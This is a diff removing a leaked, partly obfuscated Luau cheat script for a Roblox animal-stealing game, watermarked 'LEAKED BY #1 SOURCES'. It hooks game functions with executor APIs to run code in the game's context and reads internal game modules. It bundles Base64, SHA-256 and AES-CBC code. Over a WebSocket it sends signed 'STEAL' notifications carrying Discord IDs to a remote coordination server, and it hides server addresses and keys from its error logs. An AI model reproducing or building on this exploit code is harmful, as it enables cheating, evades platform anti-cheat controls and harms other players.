-			local chunk = loadstring([[            local host, pack, unpack = ...
-return function(...)
-local job = host.job
-if job and not job.done then
-job.done = true
-host.inside = true
-job.result = pack(pcall(job.fn, unpack(job.args, 1, job.args.n)))
-host.inside = false
-end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-return host.original(...)
-end
-]], "=" .. sliced104)
-
-			if not chunk then
-				tbl37.disabled = true
-				return false
-			end
-			local sliced105, sliced106 = sliced98(getfenv, v)
-
-			if sliced105 and type(sliced106) == "table" then
-				sliced98(setfenv, chunk, sliced106)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			local sliced107, sliced108 = sliced98(chunk, tbl37, pack, unpack)
-			if not sliced107 or type(sliced108) ~= "function" then
-				tbl37.disabled = true
-				return false
-			end
-			local sliced109, sliced110 = sliced98(hookfunction, v, sliced108)
-			if not sliced109 or type(sliced110) ~= "function" then
-				tbl37.disabled = true
-				return false  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-			tbl37.original = sliced110
-			tbl37.conn = sliced103
-			tbl37.target = v
-			tbl37.ready = true
-			return true
-		end
-
-		local function slicedfn53(arg, ...)
-			tbl37.job = { fn = arg, args = pack(...), done = false }
-
-			sliced98(function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				tbl37.conn:Fire(0)
-			end)
-
-			local job = tbl37.job
-			tbl37.job = nil
-			if not job or not job.done or not job.result then
-				return false
-			end
-			return true, unpack(job.result, 1, job.result.n)
-		end
-
-		local function slicedfn54()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			if tbl37.verified ~= nil then
-				return tbl37.verified
-			end
-			local v, sliced103, sliced104 = slicedfn53(slicedfn49)
-			tbl37.verified = v and sliced103 and sliced104 == true and true or false
-
-			if not tbl37.verified then
-				tbl37.disabled = true
-				tbl37.ready = false
-
-				if restorefunction then
-					sliced98(restorefunction, tbl37.target)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				elseif tbl37.original then
-					sliced98(hookfunction, tbl37.target, tbl37.original)
-				end
-			end
-
-			return tbl37.verified
-		end
-
-		local function slicedfn55(arg, ...)
-			local v = table.pack(...)
-			if type(arg) ~= "function" then
-				return false, "gameCall: argument #1 is not a function"  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			if tbl37.inside then
-				return sliced98(arg, ...)
-			end
-
-			if slicedfn52() and slicedfn54() then
-				local sliced103 = pack(slicedfn53(arg, ...))
-				if sliced103[1] then
-					return unpack(sliced103, 2, sliced103.n)
-				end
-				return slicedfn50(arg, table.unpack(v, 1, v.n))  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			return slicedfn50(arg, ...)
-		end
-
-		local function slicedfn56(arg, arg2)
-			if not arg then
-				return nil
-			end
-			local v = arg:WaitForChild(arg2, 3)
-			if not v then
-				return nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-			local sliced103, sliced104 = slicedfn55(require, v)
-			if not sliced103 then
-				return nil
-			end
-
-			if true then
-				return sliced104
-			end
-
-		end
-
-		local animals = slicedfn56(sliced91, "Animals")  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local mutations = slicedfn56(sliced91, "Mutations")
-		local traits = slicedfn56(sliced91, "Traits")
-		local plotController = slicedfn56(controllers, "PlotController")
-
-		local function slicedfn57(arg, arg2, arg3)
-			local v = animals[arg]
-			if not v or not v.Generation then
-				return 0
-			end
-			local flag25 = arg2 and arg2 ~= "None" and arg2 ~= ""
-			local n = 1  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			if flag25 then
-				local sliced103 = mutations[arg2]
-
-				if sliced103 and sliced103.Modifier then
-					n = 1 + sliced103.Modifier
-				end
-			end
-
-			local flag26 = false
-
-			if type(arg3) == "table" then
-				for _, sliced103 in arg3, nil, nil do
-					local sliced104 = traits[sliced103]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					if sliced104 then
-						if sliced103 == "Sleepy" then
-							flag26 = true
-						elseif sliced104.MultiplierModifier then
-							n += sliced104.MultiplierModifier
-						end
-					end
-				end
-			end
-
-			local slicedn39 = v.Generation * n  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			if flag26 then
-				slicedn39 *= 0.5
-			end
-
-			return math.round(slicedn39)
-		end
-
-		local sliced103 = nil
-		local tbl38 = {}
-		local tbl39 = {}
-		local tbl40 = {}
-
-		if mutations then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			for k, mutation in pairs(mutations) do
-				if type(mutation) == "table" and mutation.MainColor then
-					tbl40[k] = mutation.MainColor
-				end
-			end
-		end
-
-		local tbl41 = {}
-
-		if mutations then
-			for k in pairs(mutations) do
-				table.insert(tbl41, k)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			table.sort(tbl41)
-		end
-
-		local tbl42 = {}
-		local color = Color3.fromRGB(180, 180, 180)
-		local color2 = Color3.new(1, 1, 1)
-
-		for k, v in pairs(tbl40) do
-			local floor2 = math.floor
-			local n = v.B * 255
-			tbl42[k] = string.format("#%02X%02X%02X", math.floor(v.R * 255), math.floor(v.G * 255), floor2(n))  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		local floor2 = math.floor
-		local slicedn39 = color.B * 255
-		tbl42.Normal = string.format("#%02X%02X%02X", math.floor(color.R * 255), math.floor(color.G * 255), floor2(slicedn39))
-		up_294 = color
-		up_295 = tbl40
-		up_296 = color2
-		local function slicedfn58(B)if not B or B=="Normal"then return up_294;end;return up_295[B]or up_296;end
-		local function slicedfn59(w)return tonumber(w)or 0;end
-		local function slicedfn60(w)local B={};for I=1,string.len(w),1 do local e=string.byte(w,I);local w,H=math.floor(e/16)+1,e%16+1;B[I]=string.sub("0123456789abcdef",w,w)..string.sub("0123456789abcdef",H,H);end;return table.concat(B);end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local sliced104 = (function()local w={};for B=1,64,1 do w[string.byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",B)]=B-1;end;return{Encode=function(B)if type(B)~="string"then error("Base64 input must be a string");end;local I=string.len(B);if I>16777216 then error("Base64 input too large");end;if I==0 then return"";end;local e,H,a={},1,1;while H<=I do local I,K,L=string.byte(B,H),string.byte(B,H+1),string.byte(B,H+2);local B,A=K or 0,L or 0;local P=I*65536+B*256+A;local v,N,S,j=math.floor(P/262144)%64+1,math.floor(P/4096)%64+1,math.floor(P/64)%64+1,P%64+1;B,A,I,P=string.sub("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",v,v),string.sub("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",N,N),string.sub("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",S,S),string.sub("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",j,j);if K==nil then e[a]=B..A.."==";elseif L==nil then e[a]=B..A..I.."=";else e[a]=B..A..I..P;end;a+=1;H+=3;end;return table.concat(e);end,Decode=function(B)if type(B)~="string"then error("Base64 input must be a string");end;local I=string.len(B);if I==0 then return"";end;if I>16777216 then error("Base64 input too large");end;if I%4~=0 then error("Invalid base64 length");end;local e,H,a={},1,1;while H<=I do local K,L,A,P,v=string.byte(B,H),string.byte(B,H+1),string.byte(B,H+2),string.byte(B,H+3),H+3==I;local B,I=A==61,P==61;if(B or I)and not v then error("Invalid base64 padding");end;if B and not I then error("Invalid base64 padding");end;local N,S=w[K],w[L];if N==nil or S==nil then error("Invalid base64 character");end;v=0;if not B then v=w[A];if v==nil then error("Invalid base64 character");end;end;K=0;if not I then K=w[P];if K==nil then error("Invalid base64 character");end;end;L=N*262144+S*4096+v*64+K;S,v,N=math.floor(L/65536)%256,math.floor(L/256)%256,L%256;if B then e[a]=string.char(S);elseif I then e[a]=string.char(S,v);else e[a]=string.char(S,v,N);end;a+=1;H+=4;end;return table.concat(e);end};end)()
-		local sliced105 = (function()local w,B={1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298},{};local function I(e,H,a,K)local L,A,P,v,N,S,j,p=e[6],e[7],e[3],e[2],e[1],e[4],e[5],e[8];for W=a,K,64 do local a=W;for K=1,16,1 do local r,s,y,h=string.byte(H,a),string.byte(H,a+1),string.byte(H,a+2),string.byte(H,a+3);B[K]=bit32.bor(bit32.lshift(r,24),bit32.lshift(s,16),bit32.lshift(y,8),h);a+=4;end;for H=17,64,1 do a,W=B[H-2],B[H-15];B[H]=bit32.bxor(bit32.rrotate(a,17),bit32.rrotate(a,19),bit32.rshift(a,10))+B[H-7]+bit32.bxor(bit32.rrotate(W,7),bit32.rrotate(W,18),bit32.rshift(W,3))+B[H-16];end;local H,K,W,r,s,y,h,_=j,p,L,A,P,v,N,S;for o=1,64,1 do a=K+bit32.bxor(bit32.rrotate(H,6),bit32.rrotate(H,11),bit32.rrotate(H,25))+bit32.band(H,W)+bit32.band(bit32.bnot(H),r)+w[o]+B[o];o=a+(bit32.band(s,y)+bit32.band(h,bit32.bxor(s,y))+bit32.bxor(bit32.rrotate(h,2),bit32.rrotate(h,13),bit32.rrotate(h,22)));H,K,W,r,s,y,h,_=_+a,r,H,W,y,h,o,s;end;N,v,P,S,j,L,A,p=bit32.bor(h+N,0),bit32.bor(y+v,0),bit32.bor(s+P,0),bit32.bor(_+S,0),bit32.bor(H+j,0),(bit32.bor(W+L,0)),(bit32.bor(r+A,0)),(bit32.bor(K+p,0));end;e[1]=N;e[2]=v;e[3]=P;e[4]=S;e[5]=j;e[6]=L;e[7]=A;e[8]=p;end;return{Digest=function(w)local B,e={1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225},#w;local H=e%64;if e>=64 then I(B,w,1,e-H);end;local a={[1]=H==0 and""or(string.sub(w,-H)),[2]="\128",[3]=string.rep("\0",(bit32.band(H+32,4294967232)-H-9)%64),[4]=string.pack(">L",e*8)};w=table.concat(a);I(B,w,1,#w);H={};for I=1,8,1 do w=B[I];H[I]=string.char(bit32.extract(w,24,8),bit32.extract(w,16,8),bit32.extract(w,8,8),bit32.extract(w,0,8));end;return table.concat(H);end};end)()
-		local sliced106 = (function()local w,B,I,e,H,a,K,L,A,P,v,N,S,j,p=bit32.bxor,bit32.rrotate,buffer.copy,buffer.create,buffer.fromstring,buffer.len,buffer.tostring,buffer.readu8,buffer.readu16,buffer.readu32,buffer.writestring,buffer.writeu8,buffer.writeu16,buffer.writeu32,math.floor;local W,r,s,y,h,_=e(131072),e(65536),e(65536),e(65536),e(65536),e(65536);local function o(E,R,J,l)if l then I(J,0,E,0,R);else v(J,0,E,R);end;E,l=B(P(J,R-4),8),0.5;if R==32 then for v=32,192,32 do l=l*2%229;local T=w(P(J,v-32),A(W,p(E/65536)*2)*65536+A(W,E%65536*2),l);j(J,v,T);local d=w(P(J,v-28),T);j(J,v+4,d);T=w(P(J,v-24),d);j(J,v+8,T);d=w(P(J,v-20),T);j(J,v+12,d);T=w(P(J,v-16),A(W,p(d/65536)*2)*65536+A(W,d%65536*2));j(J,v+16,T);d=w(P(J,v-12),T);j(J,v+20,d);T=w(P(J,v-8),d);j(J,v+24,T);d=w(P(J,v-4),T);j(J,v+28,d);E=(B(d,8));end;local v=w(P(J,192),A(W,p(E/65536)*2)*65536+A(W,E%65536*2),64);j(J,224,v);local T=w(P(J,196),v);j(J,228,T);v=w(P(J,200),T);j(J,232,v);j(J,236,w(P(J,204),v));elseif R==24 then for v=24,168,24 do l=l*2%229;local R=w(P(J,v-24),A(W,p(E/65536)*2)*65536+A(W,E%65536*2),l);j(J,v,R);local T=w(P(J,v-20),R);j(J,v+4,T);R=w(P(J,v-16),T);j(J,v+8,R);T=w(P(J,v-12),R);j(J,v+12,T);R=w(P(J,v-8),T);j(J,v+16,R);T=w(P(J,v-4),R);j(J,v+20,T);E=(B(T,8));end;local v=w(P(J,168),A(W,p(E/65536)*2)*65536+A(W,E%65536*2),128);j(J,192,v);local R=w(P(J,172),v);j(J,196,R);v=w(P(J,176),R);j(J,200,v);j(J,204,w(P(J,180),v));else for v=16,144,16 do l=l*2%229;local R=w(P(J,v-16),A(W,p(E/65536)*2)*65536+A(W,E%65536*2),l);j(J,v,R);local l=w(P(J,v-12),R);j(J,v+4,l);R=w(P(J,v-8),l);j(J,v+8,R);l=w(P(J,v-4),R);j(J,v+12,l);E=(B(l,8));end;local B=w(P(J,144),A(W,p(E/65536)*2)*65536+A(W,E%65536*2),54);j(J,160,B);local v=w(P(J,148),B);j(J,164,v);B=w(P(J,152),v);j(J,168,B);j(J,172,w(P(J,156),B));end;return J;end;local function B(v,E,R,J,l,T)local d,M,C,V,F,U,q,m,Q,c,g,b,i,t,Z,D=w(L(R,J),L(v,0)),w(L(R,J+1),L(v,1)),w(L(R,J+2),L(v,2)),w(L(R,J+3),L(v,3)),w(L(R,J+4),L(v,4)),w(L(R,J+5),L(v,5)),w(L(R,J+6),L(v,6)),w(L(R,J+7),L(v,7)),w(L(R,J+8),L(v,8)),w(L(R,J+9),L(v,9)),w(L(R,J+10),L(v,10)),w(L(R,J+11),L(v,11)),w(L(R,J+12),L(v,12)),w(L(R,J+13),L(v,13)),w(L(R,J+14),L(v,14)),w(L(R,J+15),L(v,15));local X,n,f,Y,G,O,u,z,x,k,wv,Bv,Iv,ev,Hv,av=d*256+U,g*256+D,U*256+g,D*256+d,F*256+c,Z*256+V,c*256+Z,V*256+F,Q*256+t,C*256+m,t*256+C,m*256+Q,i*256+M,q*256+b,M*256+q,b*256+i;for M=16,E,16 do q,U,F,Z,Q,g,c,V,d,C,i,R,m,b,t,J=w(L(r,X),L(s,n),L(v,M)),w(L(r,f),L(s,Y),L(v,M+1)),w(L(r,n),L(s,X),L(v,M+2)),w(L(r,Y),L(s,f),L(v,M+3)),w(L(r,G),L(s,O),L(v,M+4)),w(L(r,u),L(s,z),L(v,M+5)),w(L(r,O),L(s,G),L(v,M+6)),w(L(r,z),L(s,u),L(v,M+7)),w(L(r,x),L(s,k),L(v,M+8)),w(L(r,wv),L(s,Bv),L(v,M+9)),w(L(r,k),L(s,x),L(v,M+10)),w(L(r,Bv),L(s,wv),L(v,M+11)),w(L(r,Iv),L(s,ev),L(v,M+12)),w(L(r,Hv),L(s,av),L(v,M+13)),w(L(r,ev),L(s,Iv),L(v,M+14)),w(L(r,av),L(s,Hv),L(v,M+15));k,wv,Bv,Y,G,O,u,z,X,Iv,ev,Hv,av,f,n,x=F*256+V,b*256+F,V*256+d,J*256+q,Q*256+C,t*256+Z,C*256+t,Z*256+Q,q*256+g,m*256+U,c*256+R,U*256+c,R*256+m,g*256+i,i*256+J,d*256+b;end;j(l,T,w(A(W,w(L(r,av),L(s,Hv),L(v,E+31))*512+w(L(r,k),L(s,x),L(v,E+26))*2)*65536+A(W,w(L(r,u),L(s,z),L(v,E+21))*512+w(L(r,X),L(s,n),L(v,E+16))*2),P(v,E+32)));j(l,T+4,w(A(W,w(L(r,Y),L(s,f),L(v,E+19))*512+w(L(r,ev),L(s,Iv),L(v,E+30))*2)*65536+A(W,w(L(r,wv),L(s,Bv),L(v,E+25))*512+w(L(r,G),L(s,O),L(v,E+20))*2),P(v,E+36)));j(l,T+8,w(A(W,w(L(r,z),L(s,u),L(v,E+23))*512+w(L(r,n),L(s,X),L(v,E+18))*2)*65536+A(W,w(L(r,Hv),L(s,av),L(v,E+29))*512+w(L(r,x),L(s,k),L(v,E+24))*2),P(v,E+40)));j(l,T+12,w(A(W,w(L(r,Bv),L(s,wv),L(v,E+27))*512+w(L(r,O),L(s,G),L(v,E+22))*2)*65536+A(W,w(L(r,f),L(s,Y),L(v,E+17))*512+w(L(r,Iv),L(s,ev),L(v,E+28))*2),P(v,E+44)));end;local function A(v,E,R,J,l,T)local d,M,C,V,F,U,q,m,Q,c,g,b,i,t,Z,D=w(L(y,L(R,J)*256+L(v,E+32)),L(v,E+16)),w(L(y,L(R,J+13)*256+L(v,E+45)),L(v,E+17)),w(L(y,L(R,J+10)*256+L(v,E+42)),L(v,E+18)),w(L(y,L(R,J+7)*256+L(v,E+39)),L(v,E+19)),w(L(y,L(R,J+4)*256+L(v,E+36)),L(v,E+20)),w(L(y,L(R,J+1)*256+L(v,E+33)),L(v,E+21)),w(L(y,L(R,J+14)*256+L(v,E+46)),L(v,E+22)),w(L(y,L(R,J+11)*256+L(v,E+43)),L(v,E+23)),w(L(y,L(R,J+8)*256+L(v,E+40)),L(v,E+24)),w(L(y,L(R,J+5)*256+L(v,E+37)),L(v,E+25)),w(L(y,L(R,J+2)*256+L(v,E+34)),L(v,E+26)),w(L(y,L(R,J+15)*256+L(v,E+47)),L(v,E+27)),w(L(y,L(R,J+12)*256+L(v,E+44)),L(v,E+28)),w(L(y,L(R,J+9)*256+L(v,E+41)),L(v,E+29)),w(L(y,L(R,J+6)*256+L(v,E+38)),L(v,E+30)),w(L(y,L(R,J+3)*256+L(v,E+35)),L(v,E+31));local X,n,f,Y,G,O,u,z,x,k,wv,Bv,Iv,ev,Hv,av=d*256+M,C*256+V,t*256+Z,D*256+i,g*256+b,Q*256+c,m*256+F,U*256+q,F*256+U,q*256+m,M*256+C,V*256+d,Z*256+D,i*256+t,b*256+Q,c*256+g;for F=E,16,-16 do c,C,D,b,V,m,M,d,U,Z,R,g,i,q,Q,J=w(L(y,L(h,X)*256+L(_,n)),L(v,F)),w(L(y,L(h,f)*256+L(_,Y)),L(v,F+1)),w(L(y,L(h,G)*256+L(_,O)),L(v,F+2)),w(L(y,L(h,u)*256+L(_,z)),L(v,F+3)),w(L(y,L(h,x)*256+L(_,k)),L(v,F+4)),w(L(y,L(h,wv)*256+L(_,Bv)),L(v,F+5)),w(L(y,L(h,Iv)*256+L(_,ev)),L(v,F+6)),w(L(y,L(h,Hv)*256+L(_,av)),L(v,F+7)),w(L(y,L(h,O)*256+L(_,G)),L(v,F+8)),w(L(y,L(h,z)*256+L(_,u)),L(v,F+9)),w(L(y,L(h,n)*256+L(_,X)),L(v,F+10)),w(L(y,L(h,Y)*256+L(_,f)),L(v,F+11)),w(L(y,L(h,ev)*256+L(_,Iv)),L(v,F+12)),w(L(y,L(h,av)*256+L(_,Hv)),L(v,F+13)),w(L(y,L(h,k)*256+L(_,x)),L(v,F+14)),w(L(y,L(h,Bv)*256+L(_,wv)),L(v,F+15));z,k,Iv,ev,f,Y,G,O,u,Hv,av,X,n,x,wv,Bv=m*256+M,M*256+d,Q*256+J,i*256+q,q*256+Q,J*256+i,R*256+g,U*256+Z,d*256+V,g*256+U,Z*256+R,c*256+C,D*256+b,V*256+m,C*256+D,b*256+c;end;j(l,T,w(L(y,L(h,u)*256+L(_,z)),L(v,3))*16777216+w(L(y,L(h,G)*256+L(_,O)),L(v,2))*65536+w(L(y,L(h,f)*256+L(_,Y)),L(v,1))*256+w(L(y,L(h,X)*256+L(_,n)),L(v,0)));j(l,T+4,w(L(y,L(h,Hv)*256+L(_,av)),L(v,7))*16777216+w(L(y,L(h,Iv)*256+L(_,ev)),L(v,6))*65536+w(L(y,L(h,wv)*256+L(_,Bv)),L(v,5))*256+w(L(y,L(h,x)*256+L(_,k)),L(v,4)));j(l,T+8,w(L(y,L(h,Y)*256+L(_,f)),L(v,11))*16777216+w(L(y,L(h,n)*256+L(_,X)),L(v,10))*65536+w(L(y,L(h,z)*256+L(_,u)),L(v,9))*256+w(L(y,L(h,O)*256+L(_,G)),L(v,8)));j(l,T+12,w(L(y,L(h,Bv)*256+L(_,wv)),L(v,15))*16777216+w(L(y,L(h,k)*256+L(_,x)),L(v,14))*65536+w(L(y,L(h,av)*256+L(_,Hv)),L(v,13))*256+w(L(y,L(h,ev)*256+L(_,Iv)),L(v,12)));end;local v,E,R,J,l=e(256),e(256),e(256),e(256),e(256);local function T(d,M)local C=0;for V=0,7,1 do C,d,M=if M%2==1 then(w(C,d))else C,if d>=128 then(w(d*2%256,27))else d*2%256,(p(M/2));end;return C;end;N(v,0,99);local p,d=1,1;for M=1,255,1 do p=w(p,p*2,p<128 and 0 or 27)%256;M=w(d,d*2);local C=w(M,M*4);d=w(C,C*16)%256;d=if d>=128 then(w(d,9))else d;C=w(d,d%128*2+d/128,d%64*4+d/64,d%32*8+d/32,d%16*16+d/16,99);N(v,p,C);N(E,C,p);N(R,p,(T(3,p)));N(J,p,(T(9,p)));N(l,p,(T(11,p)));end;p=0;for M=0,255,1 do d=L(v,M);local C,V,F=T(2,d),T(13,M),T(14,M);for T=0,255,1 do local U=L(v,T);S(W,p*2,d*256+U);N(y,p,L(E,w(M,T)));N(r,p,w(C,L(R,U)));N(s,p,w(d,U));N(h,p,w(F,L(l,T)));N(_,p,w(V,L(J,T)));p+=1;end;if M%64==63 then task.wait();end;end;local v=e(16);local function N(S,p,W,r,s,y)p,s=a(W)-16,y or v;j(r,0,w(P(W,0),P(s,0)));j(r,4,w(P(W,4),P(s,4)));j(r,8,w(P(W,8),P(s,8)));j(r,12,w(P(W,12),P(s,12)));S(r,0,r,0);for s=16,p,16 do j(r,s,w(P(W,s),P(r,s-16)));j(r,s+4,w(P(W,s+4),P(r,s-12)));j(r,s+8,w(P(W,s+8),P(r,s-8)));j(r,s+12,w(P(W,s+12),P(r,s-4)));S(r,s,r,s);end;end;local function S(p,W,r,s,y,h)local _,E,R,J,l,T=a(r)-16,h or v,P(r,0),P(r,4),P(r,8),P(r,12);W(r,0,s,0);j(s,0,w(P(s,0),P(E,0)));j(s,4,w(P(s,4),P(E,4)));j(s,8,w(P(s,8),P(E,8)));j(s,12,w(P(s,12),P(E,12)));for v=16,_,16 do y,p,h,E=P(r,v),P(r,v+4),P(r,v+8),P(r,v+12);W(r,v,s,v);j(s,v,w(P(s,v),R));j(s,v+4,w(P(s,v+4),J));j(s,v+8,w(P(s,v+8),l));j(s,v+12,w(P(s,v+12),T));R,J,l,T=y,p,h,E;end;end;local w={FwdMode=N,InvMode=S};local function P(v,j,p)if type(p)~="number"or p<1 or p>255 or p%1~=0 then error("Invalid PKCS7 block size");end;local W=a(v);local r=p-W%p;if j then if W+r>a(j)then error("PKCS7 output buffer too small");end;I(j,0,v,0,W);buffer.fill(j,W,r,r);return j;end;j=string.char(r);W=string.rep(j,r);return H(K(v)..W);end;local function v(j,p,W)local r=a(j);if W<=0 or r==0 or r%W~=0 then error("Invalid padded data length");end;local s=L(j,r-1);if s<1 or s>W or s>r then error("Invalid PKCS7 padding");end;W=r-s;for y=W,r-1,1 do if L(j,y)~=s then error("Invalid PKCS7 padding");end;end;if p then if W>a(p)then error("PKCS7 output buffer too small");end;I(p,0,j,0,W);return p;end;return H(string.sub(K(j),1,W));end;local function I(L,j)local p=typeof(L)=="buffer";local W,r=p and(a(L))or#L;if not j then if W==32 then r=(e(240));elseif W==24 then r=(e(208));elseif W==16 then r=(e(176));else error("Key must be 16/24/32 bytes");r=j;end;else r=j;end;return o(L,W,r,p);end;local function e(L)local j=a(L);local p;if j==240 then p=192;elseif j==208 then p=160;elseif j==176 then p=128;else error("Bad round keys");end;local function j(W,r)local s=P(typeof(W)=="buffer"and W or(H(W)),nil,16);N(function(N,W,y,h)B(L,p,N,W,y,h);end,nil,s,s,w,r);return s;end;local function B(N,W)local r=typeof(N)=="buffer"and N or(H(N));N=a(r);if N<32 or N%16~=0 then error("Invalid AES-CBC ciphertext length");end;N=H(K(r));S(nil,function(H,a,K,S)A(L,p,H,a,K,S);end,r,N,w,W);return v(N,nil,16);end;return setmetatable({Encrypt=function(H,H,a)return j(H,typeof(a)=="buffer"and a or nil);end,Decrypt=function(H,H,a)return B(H,typeof(a)=="buffer"and a or nil);end},{__tostring=function()return"AesCipher";end});end;return{new=function(B,H,H)return e(I(B));end,modes={CBC=w},pads={Pkcs7={Pad=P,Unpad=v}}};end)()
-		up_297 = sliced104
-		up_298 = nil
-		up_299 = sliced106
-		up_300 = str10
-		up_301 = HttpService
-		up_302 = slicedfn60
-		up_303 = sliced105  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_304 = str11
-		local function slicedfn61(B,I)return up_302((up_303.Digest(B..I..up_304)));end
-		up_305 = slicedn35
-		local function slicedfn62()return os.time()+up_305 ;end
-		local json = nil
-		up_306 = json
-		up_307 = sliced95
-		up_308 = sliced94
-		up_309 = tbl39
-		up_310 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_311 = slicedfn62
-		up_312 = HttpService
-		up_313 = slicedfn61
-		local function slicedfn63(B,I)if up_306 then if up_307 and up_308 then if not pcall(function()up_308 :Send(up_306 );end)then warn("[SendSteal] Failed to send, WS error");else up_309[(B.DisplayName or"").."|"..tostring(math.floor(B.Generation or 0))]=true;end;else warn("[SendSteal] Cannot send steal notification: WebSocket not connected!");up_310 ={animal=B,discordId=I};end;up_306 =nil;return;end;local e=tostring(math.floor(up_311()));local H=up_312:JSONEncode({animal=B,discordId=I or"Unknown"});local a,K=pcall(up_313,H,e);if not a or type(K)~="string"then warn("[SendSteal] Failed to build message signature");return;end;if up_307 and up_308 then local a={op="STEAL",payload=H,sig=K,ts=e};if not pcall(function()up_308 :Send(up_312:JSONEncode(a));end)then warn("[SendSteal] Failed to send, WS error");else up_309[(B.DisplayName or"").."|"..tostring(math.floor(B.Generation or 0))]=true;end;else warn("[SendSteal] Cannot send steal notification: WebSocket not connected!");up_310 ={animal=B,discordId=I};end;end
-		local sliced107 = nil
-		up_314 = slicedfn60
-		up_315 = sliced105
-		up_316 = "f2284f4121d8470513b611058e3a8ca5"
-		local function slicedfn64(w)if w then w:Close();end;end
-		up_317 = sliced94  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_318 = sliced95
-		local function slicedfn65()local B=up_317 ;up_317 =nil;up_318 =false;if getgenv()._KaWaifuWS==B then getgenv()._KaWaifuWS=nil;end;return B;end
-		up_319 = HttpService
-		up_320 = sliced97
-		up_321 = slicedn37
-		up_322 = tbl19
-		up_323 = slicedn35
-		up_324 = sliced96
-		up_325 = nil
-		up_326 = slicedfn63  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_327 = tbl30
-		up_328 = tbl31
-		up_329 = function(B)local I,e=pcall(function()local H=up_297.Decode(B);local B=buffer.fromstring(H);H=up_298 ;if not H then up_298 =up_299.new(up_300,up_299.modes.CBC,up_299.pads.Pkcs7);end;H=up_298 :Decrypt(B);if type(H)~="buffer"then return{};end;return up_301:JSONDecode(string.sub(buffer.tostring(H),17));end);if I and type(e)=="table"then return e;end;return{};end
-		up_330 = slicedfn62
-		up_331 = tbl33
-		up_332 = nil
-		up_333 = nil
-		up_334 = nil
-		up_335 = sliced93
-		up_336 = slicedfn59  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_337 = function() end
-		up_338 = nil
-		up_339 = sliced107
-		up_340 = nil
-		up_341 = slicedfn65
-		up_342 = slicedn38
-		up_343 = slicedfn64
-		up_344 = localPlayer2
-		up_345 = kaWaifuSessionId
-		up_346 = slicedfn65  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_347 = slicedfn64
-		up_348 = sliced95
-		up_349 = connect
-		up_350 = tbl19
-		up_351 = localPlayer2
-		up_352 = slicedfn62
-		up_353 = "?"
-		up_354 = function(B,I,e,H,a)return up_314((up_315.Digest(B.."|"..I.."|"..e.."|"..H.."|"..a.."|"..up_316)));end
-		up_355 = HttpService
-		up_356 = function(w)return(tostring(w or""):gsub("wss?://[^%s\"']+","<server>"):gsub("[%w%-%.]*kawaifu%.[%w]+[^%s\"']*","<server>"):gsub("joiner_%w+","<path>"):gsub("(%f[%w]key)=[^&%s\"']*","%1=<hidden>"):gsub("(%f[%w]sig)=[^&%s\"']*","%1=<hidden>"):gsub("(%f[%w]hwid)=[^&%s\"']*","%1=<hidden>"):gsub("(%f[%w]discordId)=[^&%s\"']*","%1=<hidden>"):gsub("%d+%.%d+%.%d+%.%d+:?%d*","<server>"):gsub("[Pp]ort%s*:?%s*%d+","port <hidden>"));end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_357 = sliced94
-		up_358 = slicedn36
-		up_359 = slicedn38
-		up_360 = flag24
-		up_361 = function(B,I)local e,H=pcall(up_319.JSONDecode,up_319,B);if not e or not H then return;end;if not H.op then return;end;local a=H.op;local K=H.data or{};if a=="INIT"then H=tostring(I or getgenv().KaWaifuActiveRegion or"main");e=up_320 ~=nil and H~=up_320 ;up_321 =os.time();pcall(getgenv().__kawaifu_region_ok);if up_322.hideWsError then pcall(up_322.hideWsError);end;if K.server_time then up_323 ,up_324 =K.server_time-os.time(),true;end;if up_325 then B=up_325 ;up_325 =nil;task.spawn(up_326,B.animal,B.discordId);end;up_327 ,up_328 ={},{};if K.jobs then for B,I in ipairs(K.jobs)do local L,A=I._enc;B={};if L then local P=up_329(L);if P then A,B=if type(P.jid)=="string"then P.jid else A,P.names or{};end;end;local P,v=I.job_start_time,I.payload;if A and v and v.animals then for N,S in ipairs(v.animals)do S.DisplayName=B[N]or"";end;I=up_330();for B,B in ipairs(v.animals)do 